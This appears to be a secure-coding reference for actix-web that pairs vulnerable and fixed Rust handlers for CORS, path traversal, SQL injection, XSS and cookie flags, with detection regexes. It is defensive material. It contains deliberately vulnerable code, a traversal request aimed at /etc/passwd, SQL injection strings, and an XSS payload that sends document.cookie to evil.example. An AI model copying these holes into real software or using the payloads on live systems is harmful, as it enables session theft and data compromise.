# Actix Web Security Patterns

Security patterns, common misconfigurations, and detection regexes for actix-web 4.x applications. Actix is memory-safe by construction and its typed extractors (`web::Path`, `web::Query`, `web::Json`) validate shape, but they do not validate *intent*: extracted strings still flow freely into SQL strings, filesystem paths, HTML bodies, and process arguments. The most common real-world actix vulnerabilities are CORS layers copied from development configs, `NamedFile` handlers that trust request-derived paths, `format!`-built SQL, and hand-rolled HTML responses.

---

## CORS Misconfiguration

### SA-ACTIX-01: Cors::permissive() in Production

`actix_cors::Cors::permissive()` is an explicit "anything goes" constructor: any origin, any method, any header, exposed headers, and credentials support. The crate documentation itself warns it should not be used in production, but it frequently survives the jump from local development because the app "just works" with it.

```rust
// VULNERABLE: development CORS shipped to production
use actix_cors::Cors;
use actix_web::{web, App, HttpServer};

#[actix_web::main]
async fn main() -> std::io::Result<()> {
    HttpServer::new(|| {
        let cors = Cors::permissive();
        App::new()
            .wrap(cors)
            .route("/api/orders", web::get().to(list_orders))
    })
    .bind(("0.0.0.0", 8080))?
    .run()
    .await
}
```

```rust
// SECURE: explicit origin allowlist, methods, headers, and max_age
use actix_cors::Cors;
use actix_web::{http::header, web, App, HttpServer};

#[actix_web::main]
async fn main() -> std::io::Result<()> {
    HttpServer::new(|| {
        let cors = Cors::default()
            .allowed_origin("https://app.example.com")
            .allowed_methods(vec!["GET", "POST"])
            .allowed_headers(vec![header::AUTHORIZATION, header::CONTENT_TYPE])
            .max_age(3600);
        App::new()
            .wrap(cors)
            .route("/api/orders", web::get().to(list_orders))
    })
    .bind(("0.0.0.0", 8080))?
    .run()
    .await
}
```

**Security implication:** with a permissive CORS layer, any website a logged-in user visits can issue cross-origin requests to your API and — because `permissive()` also enables credential support — read the authenticated responses. This turns every browser on the internet into a proxy for your users' sessions and defeats the same-origin policy entirely.

**Detection regex:** `Cors::permissive\s*\(`
**Checkpoint:** SA-ACTIX-01
**Severity:** warning

---

### SA-ACTIX-02: allow_any_origin() Combined with supports_credentials()

Building a `Cors::default()` chain manually and combining `allow_any_origin()` with `supports_credentials()` reproduces the worst part of `permissive()` by hand. Actix-cors mirrors the request's `Origin` header back (browsers reject a literal `*` with credentials), so the combination effectively grants every origin credentialed access.

```rust
// VULNERABLE: any origin may send and read credentialed requests
let cors = Cors::default()
    .allow_any_origin()
    .allow_any_method()
    .supports_credentials();

App::new().wrap(cors).service(profile_api);
```

```rust
// SECURE (credentialed API): pin the origin, then allow credentials
let cors = Cors::default()
    .allowed_origin("https://app.example.com")
    .allowed_methods(vec!["GET", "POST"])
    .supports_credentials();

// SECURE (public read-only API): wildcard origin WITHOUT credentials
let cors = Cors::default()
    .allow_any_origin()
    .allowed_methods(vec!["GET"])
    .max_age(86400);
```

**Security implication:** `Access-Control-Allow-Origin: <reflected>` plus `Access-Control-Allow-Credentials: true` means an attacker's page at `https://evil.example` can `fetch()` your API with the victim's session cookie and read the JSON response — account data theft with zero user interaction. A wildcard origin is only acceptable on endpoints that carry no credentials and return only public data.

**Detection regex:** `allow_any_origin\s*\(\s*\)[^;]*supports_credentials|supports_credentials\s*\(\s*\)[^;]*allow_any_origin`
**Checkpoint:** SA-ACTIX-02
**Severity:** error

---

## Path Traversal

### SA-ACTIX-03: NamedFile::open on Request-Derived Paths

`actix_files::NamedFile::open` opens whatever path it is given. Handlers that build that path with `format!` from a `match_info()` segment, query parameter, or other request data allow `../` sequences (or absolute paths) to escape the intended directory. Note that the `Files` service protects against traversal, but hand-written `NamedFile` handlers do not.

```rust
// VULNERABLE: "GET /download/..%2F..%2Fetc%2Fpasswd" walks out of ./uploads
use actix_files::NamedFile;
use actix_web::{HttpRequest, Result};

pub async fn download(req: HttpRequest) -> Result<NamedFile> {
    let filename: String = req.match_info().query("filename").parse().unwrap();
    let file = NamedFile::open(format!("./uploads/{}", filename))?;
    Ok(file)
}
```

```rust
// SECURE: strip to a bare file name, join under a fixed root, canonicalize, verify
use std::path::{Path, PathBuf};
use actix_files::NamedFile;
use actix_web::{error, web, Result};

const UPLOAD_ROOT: &str = "./uploads";

pub async fn download(path: web::Path<String>) -> Result<NamedFile> {
    let requested = path.into_inner();
    let name = Path::new(&requested)
        .file_name()
        .ok_or_else(|| error::ErrorBadRequest("invalid file name"))?;

    let full: PathBuf = Path::new(UPLOAD_ROOT).join(name);
    let canonical = full.canonicalize().map_err(error::ErrorNotFound)?;
    let root = Path::new(UPLOAD_ROOT)
        .canonicalize()
        .map_err(error::ErrorInternalServerError)?;
    if !canonical.starts_with(&root) {
        return Err(error::ErrorForbidden("path escapes upload root"));
    }
    Ok(NamedFile::open(canonical)?)
}
```

**Security implication:** path traversal on a file-serving handler exposes anything the server process can read: `/etc/passwd`, TLS private keys, `.env` files, sqlite databases, and the application binary itself. When the same path is later used for writes, it escalates to arbitrary file overwrite.

**Detection regex:** `NamedFile::open(_async)?\s*\(\s*(format!|&?req\.)`
**Checkpoint:** SA-ACTIX-03
**Severity:** error

---

## Injection

### SA-ACTIX-04: SQL Built with format! Passed to sqlx / diesel

`sqlx::query(&format!(...))` and `diesel::sql_query(format!(...))` splice request values directly into the SQL text. Both libraries provide first-class bind parameters; the `format!` form exists only because it compiles. This is the classic SQL injection, in Rust clothing.

```rust
// VULNERABLE: email value terminates the string literal and injects SQL
use actix_web::{web, Responder};
use sqlx::PgPool;

pub async fn find_user(pool: web::Data<PgPool>, email: web::Path<String>) -> impl Responder {
    let rows = sqlx::query(&format!(
        "SELECT id, email, role FROM users WHERE email = '{}'",
        email
    ))
    .fetch_all(pool.get_ref())
    .await;
    // ...
}
```

```rust
// SECURE: positional bind parameter; the driver handles quoting
use actix_web::{web, Responder};
use sqlx::PgPool;

pub async fn find_user(pool: web::Data<PgPool>, email: web::Path<String>) -> impl Responder {
    let rows = sqlx::query("SELECT id, email, role FROM users WHERE email = $1")
        .bind(email.as_str())
        .fetch_all(pool.get_ref())
        .await;
    // ...
}
```

With diesel, prefer the query builder; when raw SQL is unavoidable, use `diesel::sql_query("... WHERE email = $1").bind::<Text, _>(email)`. With sqlx, the `query!`/`query_as!` macros additionally verify the SQL at compile time.

**Security implication:** an input of `' OR '1'='1` dumps the table; `'; DROP TABLE users; --` or stacked `UPDATE` statements modify data; `UNION SELECT` reads other tables including credential stores. Because actix extractors happily deliver arbitrary strings, every `format!`-built query reachable from a route is attacker-controlled.

**Detection regex:** `sqlx::query(_as|_scalar)?\s*\(\s*&\s*format!|sql_query\s*\(\s*&?\s*format!`
**Checkpoint:** SA-ACTIX-04
**Severity:** error

---

## Cross-Site Scripting (XSS)

### SA-ACTIX-05: HttpResponse Body Built with format! and HTML Content

Actix does not include a template engine, so it is tempting to return `HttpResponse::Ok().content_type(ContentType::html()).body(format!("<h1>...{}", user_input))`. Nothing escapes the interpolated value, so any request parameter reflected this way is an XSS vector.

```rust
// VULNERABLE: query string reflected into HTML without escaping
use actix_web::{http::header::ContentType, web, HttpResponse, Responder};

#[derive(serde::Deserialize)]
pub struct SearchQuery { q: String }

pub async fn search(query: web::Query<SearchQuery>) -> impl Responder {
    HttpResponse::Ok()
        .content_type(ContentType::html())
        .body(format!("<h1>Results for {}</h1><p>No matches.</p>", query.q))
}
```

```rust
// SECURE: askama escapes interpolations by default
use actix_web::{http::header::ContentType, web, HttpResponse, Responder};
use askama::Template;

#[derive(Template)]
#[template(path = "search.html")]
struct SearchTemplate<'a> { query: &'a str }

pub async fn search(query: web::Query<SearchQuery>) -> impl Responder {
    let page = SearchTemplate { query: &query.q };
    match page.render() {
        Ok(html) => HttpResponse::Ok()
            .content_type(ContentType::html())
            .body(html),
        Err(_) => HttpResponse::InternalServerError().finish(),
    }
}
```

Alternatives: `maud` (compile-time escaping), `tera` (auto-escape on by default for `.html` templates), or `html_escape::encode_text` when a template engine is genuinely overkill. Plain-text responses built with `format!` are fine — the sink is the HTML content type plus markup. The detection regex therefore requires a `<` followed by a tag-like character (`<h1`, `</p>`, `<!DOCTYPE`), so numeric comparisons such as `format!("expected < {}", limit)` in plain-text bodies do not flag.

**Security implication:** a reflected value like `<script>fetch('https://evil.example/c?d='+document.cookie)</script>` executes in the victim's browser in your origin: session theft, credential-form injection, and drive-by actions using the victim's cookies. Combined with SA-ACTIX-06 (cookies without protective flags) the impact compounds.

**Detection regex:** `\.body\s*\(\s*format!\s*\(\s*"[^"]*<[a-zA-Z!/]`
**Checkpoint:** SA-ACTIX-05
**Severity:** error

---

## Session & Cookie Security

### SA-ACTIX-06: Cookies Built with .secure(false)

`Cookie::build(...).secure(false)` (and `SessionMiddleware`'s `cookie_secure(false)`) instructs browsers to send the cookie over plaintext HTTP as well as HTTPS. Like permissive CORS, this is usually a leftover from local development where there is no TLS.

```rust
// VULNERABLE: session cookie may travel over plaintext HTTP
use actix_web::{cookie::Cookie, HttpResponse, Responder};

pub async fn login() -> impl Responder {
    let cookie = Cookie::build("session_id", issue_token())
        .path("/")
        .http_only(true)
        .secure(false)
        .finish();
    HttpResponse::Ok().cookie(cookie).body("logged in")
}
```

```rust
// SECURE: Secure + HttpOnly + SameSite on every auth cookie
use actix_web::{cookie::{Cookie, SameSite}, HttpResponse, Responder};

pub async fn login() -> impl Responder {
    let cookie = Cookie::build("session_id", issue_token())
        .path("/")
        .http_only(true)
        .secure(true)
        .same_site(SameSite::Strict)
        .finish();
    HttpResponse::Ok().cookie(cookie).body("logged in")
}
```

For `actix-session`, the same applies to the middleware builder: keep the default `cookie_secure(true)`, and set `cookie_http_only(true)` plus a `SameSite` policy. If local development needs an insecure cookie, gate it behind `#[cfg(debug_assertions)]` rather than shipping the flag.

**Security implication:** a session cookie without the `Secure` attribute is disclosed to any on-path attacker the first time the browser follows an `http://` link or a captive portal downgrade — full session hijacking without touching the server. Missing `HttpOnly` additionally exposes the cookie to any XSS (see SA-ACTIX-05), and missing `SameSite` re-opens CSRF.

**Detection regex:** `\.secure\s*\(\s*false\s*\)|cookie_secure\s*\(\s*false\s*\)`
**Checkpoint:** SA-ACTIX-06
**Severity:** warning

---

## Additional Hardening (No Dedicated Checkpoints)

- **Payload limits:** bound request bodies with `web::PayloadConfig::new(limit)` and `web::JsonConfig::default().limit(...)` to prevent memory-exhaustion DoS; the defaults are generous.
- **Security headers:** add `middleware::DefaultHeaders` with `Content-Security-Policy`, `X-Content-Type-Options: nosniff`, and `Strict-Transport-Security` (or terminate at a proxy that does).
- **Static files:** prefer the `actix_files::Files` service (which normalizes paths) over hand-written `NamedFile` handlers; disable `show_files_listing()` in production.
- **Secrets:** load keys via environment/secret manager, not literals — the generic secret checkpoints (`SA-RS-*`, secrets scanner) cover hardcoded credentials.
- **Blocking work:** run CPU-heavy or blocking IO in `web::block` so the worker threads cannot be starved into a DoS.

---

## Remediation Priority

| Finding | Severity | Remediation Timeline | Effort |
|---------|----------|---------------------|--------|
| SA-ACTIX-04: SQL via format! in sqlx/diesel | Critical | Immediate | Low |
| SA-ACTIX-03: NamedFile path traversal | High | Immediate | Medium |
| SA-ACTIX-05: reflected XSS via body(format!) | High | Immediate | Medium |
| SA-ACTIX-02: any-origin CORS with credentials | High | Immediate | Low |
| SA-ACTIX-01: Cors::permissive() in production | Medium | 1 week | Low |
| SA-ACTIX-06: cookie .secure(false) | Medium | 1 week | Low |

## Related References

- `owasp-top10.md` — OWASP Top 10 mapping
- `rust-security-features.md` — Language-level Rust patterns (SA-RS-*)
- `axum-security.md` — Axum equivalents of the same vulnerability classes
- `api-security.md` — General API security patterns
- `authentication-patterns.md` — Session and token handling

## Changelog

| Date | Change | Reason |
|------|--------|--------|
| 2026-07-20 | Initial release | Coverage expansion |
| 2026-07-20 | Tightened SA-ACTIX-05 regex to require a tag-like character after `<` | Avoid false positives on numeric comparisons in plain-text bodies |
